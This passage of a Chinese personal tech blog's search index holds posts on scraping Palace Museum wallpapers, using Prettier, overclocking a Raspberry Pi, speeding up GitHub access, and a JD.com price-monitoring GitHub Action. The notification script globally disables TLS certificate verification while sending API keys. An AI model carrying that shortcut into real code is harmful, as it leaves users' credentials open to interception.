class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, 